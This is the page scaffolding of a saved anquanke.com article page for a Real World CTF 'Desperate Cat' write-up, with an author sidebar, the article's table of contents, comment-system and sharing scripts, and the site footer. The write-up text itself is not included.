                <div class="sidebar">
                    <div class="article-detail-user-box box-shadow" style="background-color: white">
                        <div>
                            <div class="row">
                                <div class="col col-24">
                                    <div style="background-image:url(&#39;https://p5.ssl.qhimg.com/sdm/290_80_100/t01771e47b7b4fab146.png&#39;);margin-top:-12px;height: 80px;margin-left:-12px;margin-right:-12px;background-position: center;background-size: cover;"></div>
                                    <a rel="noopener noreferrer" target="_blank" href="https://www.anquanke.com/member/122590">
                                        <div class="avatar" style="box-shadow:2px 5px 17px #eee;background-color:white;background-image: url(https://p2.ssl.qhimg.com/sdm/200_200_100/t012a2b2cc9165a693a.jpg);z-index: 4;margin-top: -40px;"></div>
                                    </a>
                                </div>
                                <div class="col col-24">
                                    <div class="user-info" style="text-align: center;margin-left: 0;">
                                        <a rel="noopener noreferrer" target="_blank" href="https://www.anquanke.com/member/122590">
                                            <div class="name" style="display:table-cell;vertical-align:middle;">
                                                <span style="display:table-cell;vertical-align:middle;"><span style="vertical-align:middle;">长亭科技</span>
<img class="user-label user-label-verify" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC">
                                                        </span>
                                            </div>
                                        </a>
                                        <div class="slogan">Smart Makes Security</div>
                                    </div>
                                </div>
                            </div>
                            <div class="bottom-info">
                                <div class="bottom-info-left">
                                    <div class="info-block">
                                        <div class="key">文章</div>
                                        <div class="value">86</div>
                                    </div>
                                    <div class="info-block">
                                        <div class="key">粉丝</div>
                                        <div class="value">96</div>
                                    </div>
                                </div>
                                <div class="bottom-info-right">
                                    <div class="info-block" style="width: auto; padding: 10px;">
                                        <div>
                                            <button type="button" style="" class="btn btn-outline-primary btn-sm follow-button"><i class="fa fa-plus" style="margin-right:5px;"></i><span>关注</span></button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <h2>TA的文章</h2>
                                                            <div class="post-item">
                                    <div class="title">
                                        <a href="https://www.anquanke.com/post/id/268125">DNS Rebinding in Browser</a>
                                    </div>
                                    <div class="date">2022-02-22 10:30:22</div>
                                </div>
                                                            <div class="post-item">
                                    <div class="title">
                                        <a href="https://www.anquanke.com/post/id/267124">RWCTF 4th Desperate Cat Writeup</a>
                                    </div>
                                    <div class="date">2022-01-26 15:30:51</div>
                                </div>
                                                            <div class="post-item">
                                    <div class="title">
                                        <a href="https://www.anquanke.com/post/id/266934">惊！Real World CTF 走下神坛？</a>
                                    </div>
                                    <div class="date">2022-01-25 16:15:02</div>
                                </div>
                                                            <div class="post-item">
                                    <div class="title">
                                        <a href="https://www.anquanke.com/post/id/264177">Real World CTF报名启动：集合dGhlIG9uZQ==</a>
                                    </div>
                                    <div class="date">2021-12-27 10:24:23</div>
                                </div>
                                                            <div class="post-item">
                                    <div class="title">
                                        <a href="https://www.anquanke.com/post/id/263430">长亭科技：安全运营视角Log4j2 漏洞应急最佳实践（附下载文档）</a>
                                    </div>
                                    <div class="date">2021-12-17 15:59:26</div>
                                </div>
                                                    </div>
                    </div>
                    <div class="input-group mb-3" style="margin-top:14px;">
                        <div class="input-group-prepend">
                                <span class="input-group-text" style="background-color:white;color:#1dada7" id="basic-addon1">
                                    <i class="fa fa-search" aria-hidden="true"></i>
                                </span>
                        </div>
                        <input type="text" class="form-control search-input" placeholder="输入关键字搜索内容" aria-label="search" aria-describedby="basic-addon1">
                    </div>
                    <div class="meta-box">
                        <h3 class="meta-box-title">相关文章</h3>
                        <div style="padding:8px;">
                            <ul class="similar—article-list">
                                                                    <li>
                                        <a href="https://www.anquanke.com/post/id/267031" target="_blank" rel="noopener noreferrer">
                                            2022DASCTF一月赛部分题解</a>
                                    </li>
                                                                    <li>
                                        <a href="https://www.anquanke.com/post/id/267233" target="_blank" rel="noopener noreferrer">
                                            Realworld CTF 2022 - RWDN 复现解析</a>
                                    </li>
                                                                    <li>
                                        <a href="https://www.anquanke.com/post/id/267183" target="_blank" rel="noopener noreferrer">
                                            Real World CTF Trust or Not Wp</a>
                                    </li>
                                                                    <li>
                                        <a href="https://www.anquanke.com/post/id/267228" target="_blank" rel="noopener noreferrer">
                                            春秋杯秋季赛“PWN梦空间” | 设计思路与解析</a>
                                    </li>
                                                                    <li>
                                        <a href="https://www.anquanke.com/post/id/266244" target="_blank" rel="noopener noreferrer">
                                            一文搞定MySQL盲注</a>
                                    </li>
                                                                    <li>
                                        <a href="https://www.anquanke.com/post/id/266757" target="_blank" rel="noopener noreferrer">
                                            活动 | BCTF全新赛季-AutoPwn“天梯”挑战2月12正式启航</a>
                                    </li>
                                                                    <li>
                                        <a href="https://www.anquanke.com/post/id/265361" target="_blank" rel="noopener noreferrer">
                                            Flare-On 8th两道题目复现</a>
                                    </li>
                                                            </ul>
                        </div>
                    </div>
                    <div class="card hot-recommand">
                        <div class="card-header">
                            热门推荐
                        </div>
                        <div class="card-body">
                            <div class="home-block-info">
                                <a rel="noopener noreferrer" href="https://www.anquanke.com/post/id/162175" target="_blank">
                                    <div class="block-info-item" style="margin-left: 0px; height: 195px; margin-top: 0px; background:url(https://p4.ssl.qhimg.com/t0103c09221eaa4f35b.png) repeat scroll center center / cover; overflow: hidden; width: 100%;">
                                        <div class="block-info-item-bg" style="width: 100%;background-color:transparent;">
                                                                                    </div>
                                    </div>
                                </a>
                            </div>
                        </div>
                    </div>
                                            <div id="sticky-wrapper" class="sticky-wrapper is-sticky" style="height: 472.06px;"><div class="article-index mCustomScrollbar _mCS_1 mCS-autoHide" style="overflow: visible; width: 226px; position: fixed; top: 60px; z-index: auto;"><div id="mCSB_1" class="mCustomScrollBox mCS-minimal-dark mCSB_vertical mCSB_outside" style="max-height: 469.06px;" tabindex="0"><div id="mCSB_1_container" class="mCSB_container" style="position:relative; top:0; left:0;" dir="ltr">
                            <h5>文章目录</h5>
                            <nav id="article-index" class="navbar navbar-light">
                                <nav class="nav nav-pills ">
                                                                            <a class="nav-link" href="https://www.anquanke.com/post/id/267124#h2-0">概述</a>                                          <a class="nav-link" href="https://www.anquanke.com/post/id/267124#h2-1">游戏开始</a>                                          <a class="nav-link" href="https://www.anquanke.com/post/id/267124#h2-2">棘手的字符转义处理</a>                                          <a class="nav-link" href="https://www.anquanke.com/post/id/267124#h2-3">Expression Language Chain</a>                                             <nav class="nav nav-pills sub-index">
                                                                                                    <a class="nav-link" href="https://www.anquanke.com/post/id/267124#h3-4">修改 Session 文件存储路径</a>                                                     <a class="nav-link" href="https://www.anquanke.com/post/id/267124#h3-5">修改 Context reloadable</a>                                                     <a class="nav-link" href="https://www.anquanke.com/post/id/267124#h3-6">修改 appBase 目录</a>                                             </nav>
                                                                                 <a class="nav-link active" href="https://www.anquanke.com/post/id/267124#h2-7">ASCII ZIP Exploit</a>                                             <nav class="nav nav-pills sub-index">
                                                                                                    <a class="nav-link" href="https://www.anquanke.com/post/id/267124#h3-8">制作 ASCII ZIP Jar</a>                                                     <a class="nav-link active" href="https://www.anquanke.com/post/id/267124#h3-9">修改 Context WatchedResource</a>                                                     <a class="nav-link" href="https://www.anquanke.com/post/id/267124#h3-10">最后一步</a>                                             </nav>
                                                                                 <a class="nav-link" href="https://www.anquanke.com/post/id/267124#h2-11">后记</a>                                          <a class="nav-link" href="https://www.anquanke.com/post/id/267124#h2-12">参考资料</a>                                  </nav>
                            </nav>
                        </div></div><div id="mCSB_1_scrollbar_vertical" class="mCSB_scrollTools mCSB_1_scrollbar mCS-minimal-dark mCSB_scrollTools_vertical" style="display: block;"><div class="mCSB_draggerContainer"><div id="mCSB_1_dragger_vertical" class="mCSB_dragger" style="position: absolute; min-height: 50px; display: block; height: 378px; max-height: 435.06px; top: 0px;"><div class="mCSB_dragger_bar" style="line-height: 50px;"></div></div><div class="mCSB_draggerRail"></div></div></div></div></div>
                                    </div>
            </div>
        </div>
    </div>
    <link href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/github.min.css" rel="stylesheet">
<script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/highlight.min.js.下载"></script>    <script>
        $(function () {
            $("img").lazyload({
                effect: "fadeIn"
            });
            $(".lazy").lazyload({
                effect: "fadeIn"
            });
        });
        $(".article-index").sticky({
            topSpacing: 60
        });
        hljs.initHighlighting();
    </script>
</main>
<script>
    $(document).ready(function () {
        $(".article-index").mCustomScrollbar({
            theme: "minimal-dark"
        });
        loadComment(true);
        getRandomNickname(false);
        var desc = "https://p4.ssl.qhimg.com/t01c34177e477b14d10.png";
        window._bd_share_config = {
            share: [{
                bdText: "RWCTF 4th Desperate Cat Writeup",
                bdDesc: desc.replace(/[&\|\\\*^%$#@\-]/g, ""),
                bdUrl: window.location.href,
                bdPic: "https://p4.ssl.qhimg.com/t01c34177e477b14d10.png",
                tag: "share_1"
            }]
        };
        with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement(
            'script')).src =
            'https://static.anquanke.com/bdshare/static/api/js/share.js?cdnversion=' + ~(-new Date() /
            36e5)];
    });
    $(window).scroll(function () {
        var top1 = $('#comment-list').offset().top;
        var gun = $(document).scrollTop();
        var top = top1 - gun;
        if (top <= 700) {
            $('.article-index').fadeOut();
        } else {
            $('.article-index').fadeIn();
        }
    });
    var post_id = "267124"; //文章id
    var user_id = "122590"; //作者用户id

    var post_favorite = false;
    var next = "";
    var comments = [];
    axios.get(api("user/favorite?target_post_id=" + post_id)).then(function (res) {
        if (res.data.success) {
            swtichFavorite(res.data.data.favorite);
            post_favorite = res.data.data.favorite;
        }
    });

    function swtichFavorite(favorite) {
        if (favorite) {
            $(".btn-favorite").html('<i class="fa fa-heart" aria-hidden="true" style="margin-right:10px;"></i>已收藏');
        }
        else {
            $(".btn-favorite").html('<i class="fa fa-heart" aria-hidden="true" style="margin-right:10px;"></i>收藏');
        }
    }

    function favorite() {
        if (getLocalUserInfo().isLogin) {
            post_favorite = !post_favorite;
            swtichFavorite(post_favorite);
            axios.post(api("user/favorite"), {"id": post_id}).then(function (res) {
            });
        }
        else {
            window.location.href = "/login";
        }
    }
    function removeSpecialChar(s) {
        if(!s)s="";
        return s.replace("'","").replace("<","").replace(">","").replace("(","").replace(")","").replace("&","").replace(":","").replace("\'","").replace("\"","").replace("=","").replace(".","").replace(";","");
    }

    function loadComment(refresh) {
        var request_url = "";
        if (refresh) {
            $("#comment-list").empty();
        }
        if (next) request_url = next;
        else request_url = api("comment?top=true&size=30&page=1&post_id=" + post_id);
        axios.get(request_url).then(function (res) {
            var normal_comment_template_source = $("#normal-comment").html();
            var normal_comment_template = Handlebars.compile(normal_comment_template_source);
            if (res.data.data && res.data.data.length > 0) {
                res.data.data.forEach(function (e) {
                    var html = "";
                    if(e.user)
                    {
                        e.user.nickname=removeSpecialChar(e.user.nickname);
                    }

                    if(e.nickname)
                    {
                        e.nickname=removeSpecialChar(e.nickname);
                    }

                    html = normal_comment_template(e);
                    $("#comment-list").append(html);
                });
                next = res.data.next;
                $("#comment-empty").hide();
            }
            else {
                $("#comment-empty").show();
                $("#loadButton").hide();
            }

            if ((!res.data.data) || res.data.data.length < 30) $("#loadButton").hide();
            else $("#loadButton").show();
        });
    }

    Handlebars.registerHelper('subcomments', function (value) {
        var html = "";
        $.each(value, function (i, item) {
            var sub_comment_template_source = $("#normal-comment").html();
            var sub_comment_template = Handlebars.compile(sub_comment_template_source);
            html += sub_comment_template(item);
        });
        return new Handlebars.SafeString(html);
    });
    Handlebars.registerHelper('if_author', function (value, opts) {
        if (value == user_id)
            return opts.fn(this);
        else
            return opts.inverse(this);
    });

    function replyBox(comment_id, nickname) {
        var reply_box_template_source = $("#reply-box").html();
        var reply_box_template = Handlebars.compile(reply_box_template_source);
        var currentLoginUser = getLocalUserInfo();
        var html = reply_box_template({
            comment_id: comment_id,
            nickname: nickname,
            currentLoginUser: currentLoginUser
        });
        $(".reply-box").empty();
        $("#reply-box-" + comment_id).append(html);
        getRandomNickname(comment_id);
    }

    function comment(comment_id) {
        if (post_id) {
            //用户未登录直接定向到登录界面
            if (!getLocalUserInfo().isLogin) {
                window.location.href = window.location.origin + '/login?redirectTo=' + window.location.href;
                return;
            }
            var data = {};
            if (comment_id)
                data.content = $("#comment-content-" + comment_id).val();
            else
                data.content = $("#comment-content").val();
            data.post_id = post_id;
            if (comment_id)
                data.parent = comment_id;
            if (comment_id)
                data.nickname = $("#comment-nickname-" + comment_id).val();
            else
                data.nickname = $("#comment-nickname").val();
            if (getLocalUserInfo().isLogin)
                data.nonce = getLocalUserInfo().user.nonce;
            axios.post(api("comment"), data)
                .then(function (response) {
                    if (response.data.success) {
                        $("#comment-empty").hide();
                        $(".reply-box").empty();
                        appendComment(comment_id, response.data.comment);
                        if (!comment_id)
                            $("#comment-content").val("");
                    } else {
                    }
                })
                .catch(function (error) {
                });
        }
    }

    function appendComment(comment_id, comment) {
        var comment_template_source = $("#normal-comment").html();
        var comment_template = Handlebars.compile(comment_template_source);
        var html = comment_template(comment);
        if (comment_id) {
            $("#comment-child-" + comment_id).prepend(html);
            $("#comment-child-" + comment_id).css("display", "block");
        } else {
            $("#comment-list").prepend(html);
        }
    }

    function likePost() {
        axios.post(api("post/like"), {"id": post_id}).then(function (res) {

        });
        $("#like_status").text("已赞");
        $(".btn-like").attr("disabled", "disabled");
        $("#like_count_area").text("(" + (parseInt($("#like_count").text().length == 0 ? 0 : ($("#like_count").text())) + 1) + ")");
    }

    function like(comment_id) {
        if (!$("#comment-like-button-" + comment_id).hasClass("liked")) {
            $("#comment-like-button-" + comment_id).addClass("liked");
            var count = $("#comment-like-count-" + comment_id).text();
            $("#comment-like-count-" + comment_id).text((count.length == 0 ? 0 : parseInt(count)) + 1);
            axios.post(api("comment/like"), {
                comment_id: comment_id,
                post_id: post_id
            })
                .then(function (response) {
                    if (response.data.success) {
                    } else {
                    }
                })
                .catch(function (error) {
                });
        }
    }

    function getRandomNickname(comment_id) {
        let nicknames = ['Helen', 'Anonymous', '教主', '妇科圣手', '男科圣手', '大表姐', '大表哥', '带头大哥', '白帽子', '黑帽子', '越南邻国宰相',
            '我不是黑客', '你全家都是黑客', '匿名用户', '管理员', '吃瓜群众', '小虎', '熊猫烧香作者', 'Ping溢出大神', 'Dir溢出大神', '神奇小子',
            '土司观光团', '网瘾患者', '杨教授'
        ];
        var nickname = nicknames[random(0, nicknames.length - 1)];
        if (comment_id)
            $("#comment-nickname-" + comment_id).val(nickname);
        else
            $("#comment-nickname").val(nickname);
        return nickname;
    }

    isFollow(122590);

</script>

    <script type="text/template" id="reply-box">
        <div class="comment-box">
            <textarea placeholder="回复 @{{nickname}} 的评论" id="comment-content-{{comment_id}}"></textarea>
            <div class="bottom-area">
                {{#if currentLoginUser.isLogin}}
                <div style="float:left;" class="hide-in-mobile-device">
                    <div style="float:left;height:28px;line-height:28px;margin-top: 2px;margin-left: 6px;">
                        <a rel="noopener noreferrer" target="_blank"
                           href="/member/{{currentLoginUser.user.id}}"
                           style="color:#333333">
                            <div>
                                <div class="avatar"
                                     style="height:28px;width:28px;float:left;background-image:url({{currentLoginUser.user.avatar}});"></div>
                                <div style="float:left;margin-left:5px;">
                                    <nobr><span class="nickname">{{currentLoginUser.user.nickname}}</span></nobr>
                                </div>
                            </div>
                        </a>
                    </div>
                </div>
                {{else}}
                <div style="float:left;" class="hide-in-mobile-device">
                    <span style="color:#666666;margin-right:4px;font-size:12px;">昵称</span>
                    <input type="text"
                           style="border:none;height:30px;background-color:#e9e9e9;font-size:12px;padding-left:8px;color:#666666"
                           id="comment-nickname-{{comment_id}}" style="" value="教主"></input>
                    <span style="margin-left:12px;color:#999999;font-size:12px;cursor:pointer"
                          onclick="getRandomNickname({{comment_id}});">
                        <i class="fa fa-refresh" aria-hidden="true" style="margin-right:4px;"></i> 换一个</span>
                </div>
                {{/if}}
                <div style="float:right;">
                    <button class="btn btn-secondary btn-sm" onclick="$('#reply-box-{{comment_id}}').empty();">取消
                    </button>
                    <button class="btn btn-primary btn-sm" onclick="comment({{comment_id}});">发表评论</button>
                </div>
            </div>
        </div>
    </script>
    <script type="text/template" id="normal-comment">
        <li id="comment-item-{{id}}" class="comment-item {{#if parent}}subcomment{{/if}}">
            {{#if user}}
            <a href="/member/{{user.id}}" target="_blank">
            <span class="img"
                  style="background: rgba(0, 0, 0, 0) url({{crop_img user.avatar 120 120}}) no-repeat scroll 50% 50% / cover;"></span>
            </a> {{else}}
            <span class="img"
                  style="background: rgba(0, 0, 0, 0) url({{crop_img avatar 120 120}}) no-repeat scroll 50% 50% / cover;"></span> {{/if}}
            <div class="comment-item-body">
                <div class="user-info">
                    {{#if user}}
                    <a href="/member/{{user.id}}" target="_blank">
                        <span class="name {{#if_eq user.user_label 'official'}}official{{/if_eq}} {{#if_eq user.user_label 'verify'}}verify{{/if_eq}} {{#if_eq user.user_label 'src'}}src{{/if_eq}}">{{user.nickname}}</span>
                        {{#if_eq user.user_label 'official'}}
                        <img class="user-label-official" style="width:15px;height:15px;"/>
                        {{/if_eq}} {{#if_eq user.user_label 'verify'}}
                        <img class="user-label-verify" style="width:15px;height:15px;"/>
                        {{/if_eq}} {{#if_eq user.user_label 'src'}}
                        <img class="user-label-src" style="width:15px;height:15px;"/>
                        {{/if_eq}} {{#if_eq user.user_label 'company'}}
                        <img class="user-label-company" style="width:15px;height:15px;"/>
                        {{/if_eq}}
                        {{#if_eq user.user_label 'team'}}
                        <img class="user-label-team" style="width:15px;height:15px;"/>
                        {{/if_eq}}
                    </a> {{else}}
                    <span class="name" style="color:#999999">{{nickname}}</span> {{/if}} {{#if_author user.id}}
                    <span class="time" style="color:#CC0033;font-weight:bold;vertical-align: middle">
                        &nbsp;·&nbsp; 本文作者
                    </span> {{/if_author}}
                    <span class="time" style="vertical-align: middle">
                        &nbsp;·&nbsp; {{date}}
                    </span>
                    <div class="user-info-right">
                        <span class="commentlist-like">
                            <span id="comment-like-button-{{id}}" onclick="like({{id}});"
                                  class="commentlist-like-count {{#if liked}}liked{{/if}}">
                                <i class="fa fa-thumbs-o-up" aria-hidden="true"></i>
                                <span id="comment-like-count-{{id}}">{{#if_not_eq like_count 0}}{{like_count}} {{/if_not_eq}}</span>
                        </span>
                        </span>
                        <a class="submit reply-comment"
                           onclick="replyBox({{id}},'{{#if user}}{{user.nickname}}{{else}}{{nickname}}{{/if}}');">回复</a>
                    </div>
                </div>
                <p>
                    <span class="text">{{content}}</span>
                <div class="reply-box" id="reply-box-{{id}}"></div>
                </p>
            </div>
            {{#if_eq parent undefine}}
            <ul id="comment-child-{{id}}" class="comment-child"
                style="{{#if comments}}display:block;{{else}}display:none; {{/if}}">
                {{subcomments comments}}
            </ul>
            {{/if_eq}}
        </li>
        {{#if comments}} {{#if parent}}
        <ul id="comment-child-{{id}}" style="padding:0px;">
            {{subcomments comments}}
        </ul>
        {{/if}} {{/if}}
    </script>

<script>
    wx.config({
        debug: false,
        appId: 'wx9ba4ea8f6c451937',
        timestamp: '1646481073',
        nonceStr: 'UlJ4uJVSb31OlU3S',
        signature: '5b323c891cfd935ffff3b19b161c928c95cc0e28',
        jsApiList: ["onMenuShareTimeline", "onMenuShareAppMessage"]
    });
    wx.ready(function () {
        wx.onMenuShareTimeline({
            title: 'RWCTF 4th Desperate Cat Writeup', // 分享标题
            link: window.location.href,
            imgUrl: 'https://p4.ssl.qhimg.com/sdm/100_100_100/t01c34177e477b14d10.png',
            success: function () {

            },
            cancel: function () {
                // 用户取消分享后执行的回调函数
            }
        });
        var desc = "https://p4.ssl.qhimg.com/t01c34177e477b14d10.png";
        wx.onMenuShareAppMessage({
            title: 'RWCTF 4th Desperate Cat Writeup',
            desc: desc.replace(/[&\|\\\*^%$#@\-]/g, ""),
            link: window.location.href,
            imgUrl: 'https://p4.ssl.qhimg.com/sdm/100_100_100/t01c34177e477b14d10.png',
            type: 'link',
            dataUrl: '',
            success: function () {

            },
            cancel: function () {

            }
        });
    });

    hs.graphicsDir = 'https://static.anquanke.com/highslide/';
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    $('.article-content img').wrap(function () {
        if (!$(this).parent().attr('href')) {
            var imgurl = $(this).attr('data-original');
            return '<a href="' + imgurl + '" class="highslide-img" onclick="return hs.expand(this);" target="_blank"></a>';
        }
    })

</script>
<footer>
    <div class="footer">
        <div class="container">
            <div class="hide-in-mobile-device">
                <div class="row">
                    <div class="item col col-6">
                        <div class="logo">
                            <img alt="安全客Logo" class="pic" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t0168809c9f19b4fec6.png" style="height:54px;">
                        </div>
                        <div style="margin-top: 20px;">
                            <div class="row">
                                <div class="col col-5">
                                    <a href="https://zhuanlan.zhihu.com/c_118578260" target="_blank" rel="noopener noreferrer">
                                        <div class="social zhihu">
                                            <img src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t014afa383e7a786b4a.png" alt="安全客" style="width: 20px; height: 20px;">
                                        </div>
                                    </a>
                                </div>

                                <div class="col col-5">
                                    <a href="https://weibo.com/360adlab" target="_blank" rel="nofollow noopener noreferrer" style="color: white">
                                        <div class="social weibo">
                                            <svg fill="currentColor" preserveAspectRatio="xMidYMid meet" height="1em" width="1em" viewBox="0 0 40 40" style="vertical-align: middle;">
                                                <g>
                                                    <path d="m15.1 28.7q0.4-0.8 0.2-1.6t-1-1.1q-0.8-0.3-1.6 0t-1.4 1q-0.5 0.8-0.3 1.5t1 1.2 1.7 0 1.4-1z m2.1-2.7q0.1-0.3 0-0.6t-0.3-0.4q-0.4-0.2-0.7 0t-0.5 0.4q-0.3 0.7 0.3 1 0.3 0.1 0.7 0t0.5-0.4z m3.8 2.3q-1 2.3-3.5 3.4t-5 0.3q-2.4-0.8-3.3-2.9t0.2-4.1q1-2.1 3.4-3.1t4.7-0.5q2.4 0.7 3.5 2.7t0 4.2z m7-3.5q-0.2-2.2-2-3.8t-4.6-2.5-6.2-0.4q-4.9 0.5-8.2 3.1t-3 5.9q0.2 2.2 2 3.8t4.7 2.5 6.1 0.4q5-0.5 8.3-3.1t2.9-5.9z m6.9 0.1q0 1.5-0.8 3.1t-2.5 3-3.7 2.7-5.1 1.8-6 0.7-6.2-0.7-5.3-2.1-3.9-3.4-1.4-4.4q0-2.6 1.6-5.5t4.4-5.8q3.7-3.7 7.6-5.2t5.5 0.1q1.4 1.4 0.4 4.7-0.1 0.3 0 0.4t0.2 0.2 0.4 0 0.3-0.1l0.1-0.1q3.1-1.3 5.5-1.3t3.4 1.4q1 1.4 0 4 0 0.3-0.1 0.4t0.1 0.3 0.3 0.2 0.3 0.1q1.3 0.4 2.3 1t1.8 1.9 0.8 2.6z m-1.7-14q1 1.1 1.3 2.5t-0.2 2.6q-0.2 0.5-0.7 0.7t-0.9 0.1q-0.6-0.1-0.8-0.6t-0.1-1q0.5-1.4-0.5-2.5t-2.4-0.8q-0.6 0.1-1-0.2t-0.6-0.8q-0.1-0.5 0.2-1t0.8-0.5q1.4-0.3 2.7 0.1t2.2 1.4z m4.1-3.6q1.9 2.1 2.5 5t-0.3 5.4q-0.2 0.6-0.8 0.8t-1.1 0.1-0.9-0.7-0.1-1.2q0.6-1.8 0.2-3.8t-1.8-3.5q-1.4-1.6-3.3-2.2t-3.9-0.2q-0.6 0.2-1.1-0.2t-0.7-1 0.2-1.1 1-0.7q2.7-0.5 5.4 0.3t4.7 3z"></path>
                                                </g>
                                            </svg>
                                        </div>
                                    </a>
                                </div>
                                <!-- Modal -->

                                <div class="col col-5">
                                    <div class="social weixin" data-toggle="modal" data-target="#wechat-qrcode">
                                        <svg fill="currentColor" preserveAspectRatio="xMidYMid meet" height="1em" width="1em" viewBox="0 0 40 40" style="vertical-align: middle;">
                                            <g>
                                                <path d="m11.3 11.6q0-0.8-0.5-1.3t-1.3-0.5q-0.8 0-1.5 0.5t-0.6 1.3q0 0.7 0.6 1.2t1.5 0.5q0.8 0 1.3-0.5t0.5-1.2z m14.4 9.8q0-0.5-0.5-1t-1.3-0.4q-0.5 0-0.9 0.4t-0.5 1q0 0.5 0.5 1t0.9 0.4q0.8 0 1.3-0.4t0.5-1z m-4.6-9.8q0-0.8-0.5-1.3t-1.2-0.5q-0.9 0-1.5 0.5t-0.7 1.3q0 0.7 0.7 1.2t1.5 0.5q0.7 0 1.2-0.5t0.5-1.2z m12.3 9.8q0-0.5-0.5-1t-1.2-0.4q-0.6 0-1 0.4t-0.4 1q0 0.5 0.4 1t1 0.4q0.7 0 1.2-0.4t0.5-1z m-5.1-7.7q-0.6-0.1-1.4-0.1-3.3 0-6 1.5t-4.4 4.1-1.6 5.5q0 1.5 0.5 3-0.7 0-1.3 0-0.5 0-1 0t-1.1-0.1-0.8-0.1-1.1-0.2-1-0.3l-4.9 2.5 1.4-4.2q-5.6-4-5.6-9.5 0-3.3 1.9-6.1t5.1-4.3 7.1-1.6q3.4 0 6.4 1.3t5.1 3.5 2.7 5.1z m11.5 10.9q0 2.3-1.4 4.3t-3.6 3.8l1.1 3.5-3.9-2.1q-2.9 0.7-4.2 0.7-3.3 0-6-1.4t-4.4-3.7-1.6-5.1 1.6-5.1 4.4-3.8 6-1.3q3.1 0 5.9 1.3t4.4 3.8 1.6 5.1z"></path>
                                            </g>
                                        </svg>
                                    </div>
                                    <div class="modal fade " id="wechat-qrcode" tabindex="-1" role="dialog" aria-hidden="true">
                                        <div class="modal-dialog  modal-sm" role="document" style="width: 265px;">
                                            <div class="modal-content" style="width: 265px !important;padding: 0px !important;">
                                                <div class="modal-header">
                                                    <h5 class="modal-title" id="exampleModalLabel">微信二维码</h5>
                                                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                                        <span aria-hidden="true">×</span>
                                                    </button>
                                                </div>
                                                <div class="modal-body" style="padding: 0px !important;">
                                                    <img src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t0151209205b47f2270.jpg" alt="安全客" style="width: 265x; height: 265px;">
                                                </div>

                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="item col col-5">
                        <h2>安全客</h2>
                        <ul>
                            <li>
                                <a href="https://www.anquanke.com/about" rel="noopener noreferrer" target="_blank">关于我们</a>
                            </li>
                           
                            <li>
                                <a href="https://www.anquanke.com/note/contact" target="_blank" rel="noopener noreferrer">联系我们</a>
                            </li>
                            <li>
                                <a href="https://www.anquanke.com/note/protocol" target="_blank" rel="noopener noreferrer">用户协议</a>
                            </li>
                        </ul>
                    </div>
                    <div class="item col col-5">
                        <h2>商务合作</h2>
                        <ul>
                            <li>
                                <a href="https://www.anquanke.com/note/business" target="_blank" rel="noopener noreferrer">合作内容</a>
                            </li>
                            <li>
                                <a href="https://www.anquanke.com/note/contact" target="_blank" rel="noopener noreferrer">联系方式</a>
                            </li>
                            <li>
                                <a href="https://www.anquanke.com/link" target="_blank" rel="noopener noreferrer">友情链接</a>
                            </li>
                        </ul>
                    </div>
                    <div class="item col col-5">
                        <h2>内容须知</h2>
                        <ul>
                            <li>
                                <a href="https://www.anquanke.com/contribute/tips" target="_blank" rel="noopener noreferrer">投稿须知</a>
                            </li>
                            <li>
                                <a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener noreferrer">转载须知</a>
                            </li>
                            <li>
                                官网QQ群8：819797106
                            </li>
                            <li>
                                官网QQ群3：830462644(已满)
                            </li>
                            <li>
                                官网QQ群2：814450983(已满)
                            </li>
                            <li>
                                官网QQ群1：702511263(已满)
                            </li>


                        </ul>
                    </div>
                    <div class="item col col-3">
                        <h2>合作单位</h2>
                        <ul>
                            <li>
                                <a href="http://www.cert.org.cn/" target="_blank" rel="noopener noreferrer">
                                    <img alt="安全客" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01592a959354157bc0.png" style="max-height: 40px;">
                                </a>
                            </li>
                            <li>
                                <a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener noreferrer">
                                    <img alt="安全客" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t014f76fcea94035e47.png" style="max-height: 50px;margin-top:10px;">
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="bottom-info">Copyright © 北京奇虎科技有限公司 360网络攻防实验室 安全客 All Rights Reserved <a href="https://beian.miit.gov.cn/">京ICP备08010314号-66</a>
                <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
                    document.write(unescape("%3Cspan id='cnzz_stat_icon_1271278035'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s22.cnzz.com/z_stat.php%3Fid%3D1271278035%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script><span id="cnzz_stat_icon_1271278035"></span><script src="https://s22.cnzz.com/z_stat.php?id=1271278035&amp;show=pic" type="text/javascript"></script>
                <script>
                    (function () {
                        var bp = document.createElement('script');
                        var curProtocol = window.location.protocol.split(':')[0];
                        if (curProtocol === 'https') {
                            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
                        }
                        else {
                            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
                        }
                        var s = document.getElementsByTagName("script")[0];
                        s.parentNode.insertBefore(bp, s);
                    })();
                </script>
            </div>
        </div>
    </div>

